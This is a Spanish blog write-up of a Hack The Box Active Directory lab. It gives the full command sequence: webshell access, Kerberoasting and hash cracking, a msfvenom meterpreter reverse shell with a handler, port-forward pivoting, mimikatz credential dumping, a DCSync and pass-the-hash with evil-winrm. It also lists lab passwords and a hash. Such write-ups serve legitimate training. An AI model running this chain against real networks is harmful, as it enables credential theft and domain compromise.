<!DOCTYPE html>
<html lang="en-us">

<head><title>
    
    Laboratorio De Enumeración Y Ataques De AD - Parte 1 | 
    
    CHL Blog
</title>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<link rel="canonical" href="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-enumeraci%C3%B3n-y-ataques-de-ad---parte-1/" />
<link rel="icon" type="image/png" href="https://chlorenzo.com/image/favicon.ico">


<meta name="description" content="
    En este laboratorio de Hack The Box, simulamos una intrusión en una infraestructura corporativa basada en Active Directory. Partiendo de una webshell preinstalada, llevamos a cabo técnicas de enumeración, ataque Kerberoasting, pivoting entre máquinas y, finalmente, compromiso del Domain Controller mediante un ataque DCSync. Se utilizaron herramientas como PowerView, Rubeus, Mimikatz, Metasploit, entre otras.
    "
/>
<meta property="og:description" content="
    En este laboratorio de Hack The Box, simulamos una intrusión en una infraestructura corporativa basada en Active Directory. Partiendo de una webshell preinstalada, llevamos a cabo técnicas de enumeración, ataque Kerberoasting, pivoting entre máquinas y, finalmente, compromiso del Domain Controller mediante un ataque DCSync. Se utilizaron herramientas como PowerView, Rubeus, Mimikatz, Metasploit, entre otras.
    " 
/>




<meta property="og:title" content="Laboratorio de Enumeración y ataques de AD - Parte 1" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-enumeraci%C3%B3n-y-ataques-de-ad---parte-1/" /><meta property="article:section" content="pagina_web" />
<meta property="article:published_time" content="2025-07-28T00:00:00+00:00" />
<meta property="article:modified_time" content="2025-07-28T00:00:00+00:00" />





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Laboratorio de Enumeración y ataques de AD - Parte 1">
  <meta name="twitter:description" content="En este laboratorio de Hack The Box, simulamos una intrusión en una infraestructura corporativa basada en Active Directory. Partiendo de una webshell preinstalada, llevamos a cabo técnicas de enumeración, ataque Kerberoasting, pivoting entre máquinas y, finalmente, compromiso del Domain Controller mediante un ataque DCSync. Se utilizaron herramientas como PowerView, Rubeus, Mimikatz, Metasploit, entre otras.">


  <meta itemprop="name" content="Laboratorio de Enumeración y ataques de AD - Parte 1">
  <meta itemprop="description" content="En este laboratorio de Hack The Box, simulamos una intrusión en una infraestructura corporativa basada en Active Directory. Partiendo de una webshell preinstalada, llevamos a cabo técnicas de enumeración, ataque Kerberoasting, pivoting entre máquinas y, finalmente, compromiso del Domain Controller mediante un ataque DCSync. Se utilizaron herramientas como PowerView, Rubeus, Mimikatz, Metasploit, entre otras.">
  <meta itemprop="datePublished" content="2025-07-28T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-07-28T00:00:00+00:00">
  <meta itemprop="wordCount" content="1034">
  <meta itemprop="keywords" content="Hackthebox,AD">




<link rel="stylesheet" href="https://chlorenzo.com/main.min.css">





<script src="https://chlorenzo.com/bundle.js"></script>







<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>




    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4G9W14SLG4"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4G9W14SLG4');
</script>






</head>

<body><header id="header">
  <div class="top-bar">
    <div class="container-md">

      <div class="row align-items-center">
        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
          <ul>
    
    

    
    <li>
        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
            <i class="fab fa-youtube"></i></a>
    </li>
    

    
    <li>
        <a href="https://www.instagram.com/19chl96/" target="_blank">
            <i class="fab fa-instagram"></i></a>
    </li>
    

    
    <li>
        <a href="https://github.com/chernadez321" target="_blank">
            <i class="fab fa-github"></i></a>
    </li>
    

    

    
    <li>
        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
            <i class="fab fa-linkedin"></i></a>
    </li>
    

</ul>
        </div>

        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
            <i class="fas fa-bars"></i>
          </button>
        </div>

        <div class="col-6 col-sm-4">
          <h2 class="title"><a href="https://chlorenzo.com/">CHL Blog</a></h2>
        </div>

        
        <div class="col-3 col-sm-4">
          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
              role="search">
              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
              <button class="btn" type="submit">
                <i class="fa fa-search"></i>
              </button>
            </form>
          </div>
        </div>
        

      </div>
    </div>
  </div>

  <div class="container-md">
    <nav class="navbar navbar-expand-sm navbar-dark bg-dark sticky-top">
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav mx-auto">

          <li class="nav-item d-block d-sm-none">
            <ul class="social-buttons">
              <ul>
    
    

    
    <li>
        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
            <i class="fab fa-youtube"></i></a>
    </li>
    

    
    <li>
        <a href="https://www.instagram.com/19chl96/" target="_blank">
            <i class="fab fa-instagram"></i></a>
    </li>
    

    
    <li>
        <a href="https://github.com/chernadez321" target="_blank">
            <i class="fab fa-github"></i></a>
    </li>
    

    

    
    <li>
        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
            <i class="fab fa-linkedin"></i></a>
    </li>
    

</ul>
            </ul>
          </li>

          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="https://chlorenzo.com/">
              Home
            </a>
          </li>
          
          
          
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
              Blog
            </a>
            <div class="dropdown-menu">
              
              
                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
              
              
              
                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
              
              
              
                <div class="dropdown-divider"></div>
              
              
              
                <a class="dropdown-item" href="https://chlorenzo.com/tags/">Búsqueda por etiquetas</a>
              
              
            </div>
          </li>
          
          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="https://chlorenzo.com/pagina_web/trayectoria/">
              Trayectoria
            </a>
          </li>
          
          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="https://chlorenzo.com/pagina_web/contact/">
              Contacto
            </a>
          </li>
          
          
        </ul>

        
        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
          onsubmit="return executeQuery('xs');" role="search">
          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
          <button class="btn" type="submit">
            <i class="fa fa-search"></i>
          </button>
        </form>
        

      </div>
    </nav>
  </div>
</header>

<main class="blog-content">
    <div class="container-md">
        <div class="row">
            
            <div class="col-lg-2 d-none d-xl-block">
                <div class="ad-left-offset"></div>
                
            </div>

            <div class="col-md-12 col-lg-8 px-lg-4">
                

                <h1 class="title">Laboratorio de Enumeración y ataques de AD - Parte 1</h1>

                <div class="container-fluid px-0 mb-4">
                    <div class="row align-items-end">
                        <div class="col-md-4 date-time">
                            <span class="date">
    Jul 28, 2025
</span>
                            &centerdot;
                            <span class="time-to-read">
    6 mins read</span>
                        </div>

                        <div class="col-md-8 tags ">
                            
                            <a href="https://chlorenzo.com/tags/hackthebox"><span
                                    class="tag bg-dark">hackthebox</span></a>
                            
                            <a href="https://chlorenzo.com/tags/ad"><span
                                    class="tag bg-dark">AD</span></a>
                            
                        </div>
                    </div>
                </div>

                

                <h4 id="enunciado">Enunciado</h4>
<p>Un miembro del equipo inició una prueba de penetración externa y fue transferido a otro proyecto urgente antes de terminarla. Tras realizar un reconocimiento del servidor web externo, logró encontrar y explotar una vulnerabilidad de carga de archivos. Antes de cambiar de proyecto, nuestro compañero dejó un shell web protegido con contraseña (con las credenciales: <code>admin:My_W3bsH3ll_P@ssw0rd!</code>) en el <code>/uploads</code>directorio para que pudiéramos empezar desde él. Como parte de esta evaluación, nuestro cliente, Inlanefreight, nos autorizó a evaluar nuestra capacidad de penetración y está interesado en determinar qué tipos de problemas de alto riesgo existen en el entorno de Active Directory. Aprovechar el shell web para establecerse inicialmente en la red interna. Analizar el entorno de Active Directory en busca de fallos y configuraciones incorrectas para avanzar lateralmente y, en última instancia, comprometer el dominio.</p>
<p>Aplique lo aprendido en este módulo para comprometer el dominio y responder las preguntas a continuación para completar la parte I de la evaluación de habilidades.</p>
<h4 id="reconocimiento"><strong>Reconocimiento</strong></h4>
<p>Iniciamos el reconocimiento por la  información que nos proporcionan en el guión. Visitamos el servidor web y vemos los siguiente:</p>
<p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/recon1.png" alt=""></p>
<p>Efectivamente desde esta pestaña nos permite subir archivos al servidor. Vamos a ir a la ruta <code>/uploads</code>
<code>http://&lt;IP&gt;/uploads/</code>
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/recon2.png" alt="">
Seleccionamos la primera y vemos que nos dirige a la webshell que nos hablan al principio. Proporcionamos las credenciales que nos habían brindado.
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/recon3.png" alt="">
<strong>Envíe el contenido del archivo flag.txt al escritorio del administrador del servidor web</strong>
Y tenemos acceso a la webshell.
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/recon4.png" alt="">
Vemos que justo encima del Submit en la barra inferiror podemos ejecutar comandos. Vamos a la ruta que nos dicen para obtener nuestra primera flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>dir C:\Users\Administrator\Desktop\
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag1-1.png" alt="">
Y la leemos con el comando:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>type C:\Users\Administrator\Desktop\flag.txt
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag1-2.png" alt=""></p>
<p><strong>Kerberost crea una cuenta con el SPN MSSQLSvc/SQL01.inlanefreight.local:1433 y envía el nombre de la cuenta como respuesta</strong>
Vamos a obtener el nombre del <code>Domain Controller</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain().FindDomainController().Name
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag2-1.png" alt="">
Resolvemos la IP del <code>Domain Controller</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Resolve-DnsName DC01.INLANEFREIGHT.LOCAL
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag2-2.png" alt="">
Luego de intentar trabajar con herramientas como <code>Powerview</code>,<code> GetUserSPN.py</code> y no tener éxito. Lanzamos el comando integrado de <code>powershell</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>setspn -T inlanefreight.local -Q */*
</span></span></code></pre></div><p><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setspn">Ver más de SetSPN</a></p>
<p>Donde aquí vemos algunos de los usuarios válidos vinculados a servicios que corren por el puerto 1433, si nos fijamos nuestra flag estamos buscando <code>MSSQLSvc/SQL01.inlanefreight.local:1433</code> que aquí nos aparece una cuenta <code>svc_sql</code> asociada a el.
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag2-3.png" alt="">
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag2-4.png" alt=""></p>
<p><strong>Descifra la contraseña de la cuenta. Envía el valor en texto plano:</strong>
Vale ya tenemos la cuenta que es <code>svc_sql</code> ahora vamos a aplicar kerberoasting para obtener su contraseña, para esto vamos  a utilizar la herramienta <code>Rubeus</code>.
<a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe">Link para descargar Rubeus</a>
Luego que lo tenemos en local lo subimos a a webshell.
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag3-1.png" alt="">
Y ejecutamos el comando:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Rubeus.exe kerberoast /user<span style="color:#960050;background-color:#1e0010">:</span>svc_sql /nowrap
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag3-2.png" alt="">
Al final nos va a a dar un hash el cual vamos a copiar para descifrar en local con <code>hascat </code>o <code>john</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">13100</span> hash1.txt /usr/share/wordlists/rockyou.txt
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag3-3.png" alt="">
Y vemos que nos da de contraseña <code>lucky7</code>.</p>
<p><strong>Envíe el contenido del archivo flag.txt en el escritorio del Administrador en MS01</strong>
Confirmamos el objetivo</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ping MS01
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag4-1.png" alt="">
Comprobamos las credenciales que tenemos contra el siguiente objetivo, mediante <code>SMB</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>net use \\MS01\C$ /user<span style="color:#960050;background-color:#1e0010">:</span>inlanefreight.local\svc_sql lucky7
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag4-2.png" alt="">
Nos dan <code>OK</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>dir \\MS01\C$\Users\Administrator\Desktop
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag4-3.png" alt=""></p>
<p>Leemos la flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>type \\MS01\C$\Users\Administrator\Desktop\flag.txt
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag4-4.png" alt=""></p>
<p><strong>Encuentra las credenciales de texto sin cifrar de otro usuario del dominio. Envía el nombre de usuario como respuesta.</strong></p>
<p>Listamos la carpeta de Usuarios de la Máquina <code>MS01</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>dir \\MS01\C$\Users\
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag5-1.png" alt="">
Y vemos ahí los usuarios.</p>
<p><strong>Envíe la contraseña en texto sin cifrar de este usuario.</strong>
Tenemos las credenciales del usuario <code>svc_sql</code> para acceder a la máquina MS01.
Tenemos que el ip de <code>MS01</code> es 172.16.6.50
Y necesitamos la contraseña del usuario tpetty.</p>
<ul>
<li>Vamos a obtener una shell en la máquina pivote
Ejecutamos desde nuestra máquina.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/meterpreter/reverse_https lhost<span style="color:#f92672">=</span>&lt;IP_máquina_atacante&gt; -f exe -o backupscript.exe LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-1.png" alt="">
Subimos el payload para la máquina pivote que nos dan en <code>HTB</code>.</p>
<p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-2.png" alt="">
Utilizando metasploit nos ponemos en escucha en nuestra máquina atacante:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; use exploit/multi/handler 
</span></span><span style="display:flex;"><span>set LHOST 10.10.15.154
</span></span><span style="display:flex;"><span>set LPORT <span style="color:#ae81ff">4444</span>
</span></span><span style="display:flex;"><span>set payload windows/x64/meterpreter/reverse_https
</span></span><span style="display:flex;"><span>run
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-3.png" alt="">
Ejecutamos el payload en el pivote.
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-4.png" alt="">
En meterpreter ponemos <code>shell</code> y luego <code>powershell.exe</code>. Para obtener una terminal powershell.
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-5.png" alt=""></p>
<p>Observamos que <code>MS01</code> tiene el puerto 3389 abierto.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Test-NetConnection -ComputerName MS01 -Port <span style="color:#ae81ff">3389</span>
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-6.png" alt="">
Con lo que nos vamos a intentar conectar por ahí.
Hacemos portforwarding desde el pivote hacia <code>MS01</code> para conectarnos desde nuestra máquina atacante.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>netsh.exe interface portproxy add v4tov4 listenport=<span style="color:#ae81ff">8888</span> listenaddress=&lt;IP_pivote&gt; connectport=<span style="color:#ae81ff">3389</span> connectaddress=<span style="color:#ae81ff">172.16</span>.6.50
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-7.png" alt="">
Nos conectamos remoto por RDP desde nuestra máquina atacante hacia <code>MS01</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>xfreerdp3 /v:&lt;IP_pivote&gt;:8888 /u:<span style="color:#e6db74">&#34;inlanefreight\svc_sql&#34;</span> /p:lucky7 /dynamic-resolution /drive:Shared,/opt/Tools/Windows
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-8.png" alt=""></p>
<p>Nos copiamos mimikatz.exe de nuestra máquina atacante para <code>MS01</code>.
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-9.png" alt="">
Vamos a la ruta donde copiamos mimikatz.exe y lo abrimos <code>.\mimikatz.exe</code></p>
<p>Ejecutamos <code>mimikatz</code> para buscar las credenciales almacenadas en la máquina:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>privilege::debug
</span></span><span style="display:flex;"><span>sekurlsa::logonpasswords
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag6-11.png" alt=""></p>
<p><strong>¿Qué ataque puede realizar este usuario?</strong>
Tenemos el usuario <code>tpetty</code> y su contraseña <code>Sup3rS3cur3D0m@inU2eR</code>.
Vamos a copiar la herramienta <code>PowerView.ps1</code> a <code>MS01</code>
Vamos al directorio donde la copiamos desde powershell e importamos el módulo.
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag7-1.png" alt="">
Consultamos información sobre el usuario tpetty y guardamos el <code>SID</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-DomainUser -Identity tpetty | select samaccountname,objectsid,memberof,useraccountcontrol |fl
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag7-2.png" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$sid= <span style="color:#e6db74">&#34;S-1-5-21-2270287766-1317258649-2146029398-4607&#34;</span>
</span></span></code></pre></div><p>Vemos si tiene los permisos para <code>DCSync</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ObjectAcl <span style="color:#e6db74">&#34;DC=inlanefreight,DC=local&#34;</span> -ResolveGUIDs | ? { ($_.ObjectAceType <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#39;Replication-Get&#39;</span>)} | ?{$_.SecurityIdentifier <span style="color:#f92672">-match</span> $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
</span></span></code></pre></div><p>Y vemos que sí.
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag7-3.png" alt=""></p>
<p>Usamos <code>runas.exe</code> para abrirnos una powershell bajo la cuenta de tpetty, proporcionamos su credencial.</p>
<pre tabindex="0"><code class="language-cmd-session" data-lang="cmd-session">C:\Windows\system32&gt;runas /netonly /user:INLANEFREIGHT\tpetty powershell
Enter the password for INLANEFREIGHT\tpetty:
</code></pre><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag7-4.png" alt="">
Vamos y ejecutamos <code>mimikatz.exe</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>privilege::debug
</span></span><span style="display:flex;"><span>lsadump::dcsync /domain<span style="color:#960050;background-color:#1e0010">:</span>INLANEFREIGHT.LOCAL /user<span style="color:#960050;background-color:#1e0010">:</span>INLANEFREIGHT\administrator
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag7-6.png" alt=""></p>
<p>Y efectivamente podemos realizar el ataque <code>DCSync</code>.</p>
<p>admin_hash -&gt;27dedb1dab4d8545c6e1c66fba077da0</p>
<p><strong>Tome el control del dominio y envíe el contenido del archivo flag.txt en el Escritorio del administrador en DC01</strong>
Vamos con el <code>DC01</code>, vamos a ubicarlo:
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag8-1.png" alt="">
Tiene de IP -&gt; 172.16.6.3, luego tenemos el Usuario <code>Administrator</code> y su <code>hash</code>.
Vamos a ver los puertos que tiene abiertos para intentar conectarnos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Test-NetConnection -ComputerName DC01 -Port <span style="color:#ae81ff">3389</span>
</span></span><span style="display:flex;"><span>Test-NetConnection -ComputerName DC01 -Port <span style="color:#ae81ff">5985</span>
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag8-2.png" alt="">
Vemos que el 3389 nos da error pero el 5985 nos da OK.
Vamos a hacer un <code>portforwarding</code> hacia ese puerto e intentar acceder desde nuestra máquina atacante. Vamos en nuestra máquina pivote:
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag8-3.png" alt=""></p>
<pre tabindex="0"><code class="language-meterpreter" data-lang="meterpreter">portfwd add -l 9999 -p 5985 -r 172.16.6.3
</code></pre><p>Utilizamos evil-winrm para conectarnos:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i localhost --port <span style="color:#ae81ff">9999</span> -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag8-4.png" alt="">
Ya solo nos movemos a la ubicación de la flag y la leemos
<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_1/flag8-5.png" alt=""></p>
<p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>


                <div id="social-media-share">
	<p><i>Escríbeme por cualquiera de las vías</i></p>
	
	<div class="share-buttons">
	    
		<a href="https://www.instagram.com/19chl96/" 
   			target="_blank" 
   			title="Sígueme en Instagram">
    		<img src=https://chlorenzo.com/icons/45px/instagram.png alt="Instagram">
		</a>

		<a  href="https://www.linkedin.com/in/chlinked/"
	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
	        title="Share on LinkedIn. Opens in a new window." >
	        <img src=https://chlorenzo.com/icons/48px/linkedin.png>
	    </a>

	    <a href="https://mail.google.com/mail/?view=cm&fs=1&to=chlorenzo96@gmail.com&su=Para Carlos&body=Hola." 
   		   target="_blank" 
   		   title="Enviar correo usando Gmail">
    	<img src=https://chlorenzo.com/icons/48px/email.png alt="Email">
		</a>

		

	</div>
</div>



                
                <br>
                <div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        var disqus_shortname = '';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
            </div>

            <div class="col-lg-2 d-none d-xl-block">
                <div class="ad-right-offset"></div>
                
            </div>
        </div>
    </div>
</main>

<footer class="bg-dark text-light py-4">
    <div class="container-md">
        <div class="row justify-content-center">
            <div class="col-12">
                <nav class="navbar navbar-expand-sm navbar-dark bg-dark justify-content-center">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link" href="https://chlorenzo.com/">Home</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>
    <div class="text-center mt-3">
        <p>© 2025 Carlos Hernández Lorenzo</p>
    </div>
</footer>


<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
<gcse:searchresults-only></gcse:searchresults-only>

</body>

</html>